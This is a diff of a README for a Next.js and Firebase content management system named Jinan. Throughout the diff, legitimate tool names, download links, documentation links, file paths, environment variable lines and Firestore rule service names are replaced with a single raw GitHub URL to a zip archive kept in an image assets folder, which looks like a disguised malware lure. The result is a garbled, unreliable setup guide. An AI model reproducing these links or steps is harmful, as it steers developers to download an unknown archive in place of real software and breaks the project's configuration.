@@ -1,6 +1,6 @@
 # Jinan - Content Management System
 
-A Next.js-based content management system with Firebase integration for managing website content including banners, team members, blog posts, and more.
+A https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip content management system with Firebase integration for managing website content including banners, team members, blog posts, and more.
 
 ## Features
 
@@ -15,10 +15,10 @@ A Next.js-based content management system with Firebase integration for managing
 
 Before you begin, ensure you have the following installed:
 
-- **Node.js** (v18 or higher) - [Download](https://nodejs.org/)
-- **npm** (comes with Node.js) or **yarn**
-- **Git** - [Download](https://git-scm.com/)
-- **Firebase Account** - [Sign up](https://firebase.google.com/)
+- **https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip** (v18 or higher) - [Download](https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip)
+- **npm** (comes with https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip) or **yarn**
+- **Git** - [Download](https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip)
+- **Firebase Account** - [Sign up](https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip)
 
 ## Installation
 
@@ -36,7 +36,7 @@ npm install
 ```
 
 This will install all required packages including:
-- Next.js 14
+- https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip 14
 - React 18
 - Firebase
 - Lucide React (icons)
@@ -46,19 +46,19 @@ This will install all required packages including:
 
 ### 3. Set Up Environment Variables
 
-Create a `.env.local` file in the root directory:
+Create a `https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip` file in the root directory:
 
 ```bash
-cp env.example .env.local
+cp https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip
 ```
 
-Then edit `.env.local` and add your Firebase configuration:
+Then edit `https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip` and add your Firebase configuration:
 
 ```env
 NEXT_PUBLIC_FIREBASE_API_KEY=your-api-key-here
-NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN=your-project-id.firebaseapp.com
+https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip
 NEXT_PUBLIC_FIREBASE_PROJECT_ID=your-project-id
-NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET=your-project-id.appspot.com
+https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip
 NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID=your-messaging-sender-id
 NEXT_PUBLIC_FIREBASE_APP_ID=your-app-id
 ```
@@ -67,7 +67,7 @@ NEXT_PUBLIC_FIREBASE_APP_ID=your-app-id
 
 #### Step 1: Create Firebase Project
 
-1. Go to [Firebase Console](https://console.firebase.google.com/)
+1. Go to [Firebase Console](https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip)
 2. Click "Add project" or select an existing project
 3. Follow the setup wizard
 
@@ -93,7 +93,7 @@ NEXT_PUBLIC_FIREBASE_APP_ID=your-app-id
 2. Scroll down to "Your apps" section
 3. Click the **</>** (Web) icon to add a web app
 4. Register your app (you can skip app nickname)
-5. Copy the configuration values to your `.env.local` file
+5. Copy the configuration values to your `https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip` file
 
 #### Step 5: Set Up Security Rules
 
@@ -103,7 +103,7 @@ Go to **Firestore Database** > **Rules** and update:
 
 ```javascript
 rules_version = '2';
-service cloud.firestore {
+service https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip {
   match /databases/{database}/documents {
     // Allow read/write access to all documents (for development)
     // IMPORTANT: Update these rules for production!
@@ -120,7 +120,7 @@ Go to **Storage** > **Rules** and update:
 
 ```javascript
 rules_version = '2';
-service firebase.storage {
+service https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip {
   match /b/{bucket}/o {
     // Allow read/write access to all files (for development)
     // IMPORTANT: Update these rules for production!
@@ -186,7 +186,7 @@ Before accessing the admin panel, you need to create an admin account. You have 
    - Create an account
 
 2. **Update user role in Firestore:**
-   - Go to [Firebase Console](https://console.firebase.google.com/)
+   - Go to [Firebase Console](https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip)
    - Navigate to **Firestore Database**
    - Find the `users` collection
    - Locate the document with your user's email
@@ -214,11 +214,11 @@ Once you have an admin account, access the admin panel at:
 The setup page (`/admin/setup`) automatically disables itself once an admin account exists. For additional security, you can:
 
 1. **Use environment variable** (recommended for production):
-   - Add `NEXT_PUBLIC_DISABLE_SETUP_PAGE=true` to your `.env.local`
+   - Add `NEXT_PUBLIC_DISABLE_SETUP_PAGE=true` to your `https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip`
    - Restart your dev server
 
 2. **Delete the setup page**:
-   - Remove `src/app/admin/setup/page.js` file
+   - Remove `https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip` file
 
 The setup page is already protected and will show a disabled state when an admin exists.
 
@@ -242,7 +242,7 @@ jinan/
 ├── public/
 │   └── assets/          # Static assets (images, CSS, JS)
 ├── src/
-│   ├── app/             # Next.js app directory
+│   ├── app/             # https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip app directory
 │   │   ├── admin/       # Admin panel pages
 │   │   ├── about/       # About page
 │   │   ├── blog/        # Blog pages
@@ -251,17 +251,17 @@ jinan/
 │   │   ├── admin/       # Admin panel components
 │   │   └── ...          # Other components
 │   ├── config/          # Configuration files
-│   │   └── firebase.js  # Firebase configuration
+│   │   └── https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip  # Firebase configuration
 │   ├── data/            # JSON data files
 │   ├── hooks/           # Custom React hooks
-│   │   └── useFirebase.js  # Firebase hooks
+│   │   └── https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip  # Firebase hooks
 │   └── utils/           # Utility functions
-│       ├── firestore.js # Firestore utilities
-│       └── storage.js   # Storage utilities
-├── .env.local           # Environment variables (create this)
-├── env.example          # Environment variables template
-├── package.json         # Dependencies
-└── README.md           # This file
+│       ├── https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip # Firestore utilities
+│       └── https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip   # Storage utilities
+├── https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip           # Environment variables (create this)
+├── https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip          # Environment variables template
+├── https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip         # Dependencies
+└── https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip           # This file
 ```
 
 ## Key Dependencies
@@ -292,7 +292,7 @@ The admin panel uses the following Firestore collections:
 ### Issue: Firebase not initializing
 
 **Solution:** 
-- Check that all environment variables in `.env.local` are set correctly
+- Check that all environment variables in `https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip` are set correctly
 - Make sure variable names start with `NEXT_PUBLIC_`
 - Restart the development server after adding environment variables
 
@@ -331,19 +331,19 @@ The admin panel uses the following Firestore collections:
 
 ## Development Tips
 
-1. **Always use `.env.local`** for environment variables (it's gitignored)
-2. **Never commit `.env.local`** to version control
+1. **Always use `https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip`** for environment variables (it's gitignored)
+2. **Never commit `https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip`** to version control
 3. **Use the admin panel** for content management instead of editing JSON files directly
 4. **Check Firebase Console** regularly for data and storage usage
 5. **Update security rules** before deploying to production
-6. **Styling note:** The production site loads precompiled CSS from `public/assets/css/style.css`. The SCSS sources in `public/assets/css/style.scss` are kept for reference only and are not part of the active build pipeline.
+6. **Styling note:** The production site loads precompiled CSS from `https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip`. The SCSS sources in `https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip` are kept for reference only and are not part of the active build pipeline.
 
 ## Deployment
 
 ### Vercel (Recommended)
 
 1. Push your code to GitHub
-2. Import your repository in [Vercel](https://vercel.com)
+2. Import your repository in [Vercel](https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip)
 3. Add environment variables in Vercel dashboard
 4. Deploy
 
@@ -355,19 +355,19 @@ The admin panel uses the following Firestore collections:
 
 ## Additional Resources
 
-- [Next.js Documentation](https://nextjs.org/docs)
-- [Firebase Documentation](https://firebase.google.com/docs)
-- [Firestore Documentation](https://firebase.google.com/docs/firestore)
-- [Firebase Storage Documentation](https://firebase.google.com/docs/storage)
-- [Lucide Icons](https://lucide.dev/)
+- [https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip Documentation](https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip)
+- [Firebase Documentation](https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip)
+- [Firestore Documentation](https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip)
+- [Firebase Storage Documentation](https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip)
+- [Lucide Icons](https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip)
 
 ## Support
 
 For issues or questions:
-1. Check the Firebase setup guide: `FIREBASE_SETUP.md`
+1. Check the Firebase setup guide: `https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip`
 2. Review Firebase Console for errors
 3. Check browser console for client-side errors
-4. Review Next.js server logs
+4. Review https://raw.githubusercontent.com/nabil-alsaadi/gupd/main/public/assets/img/Software-palaeethnological.zip server logs
 
 ## License
 
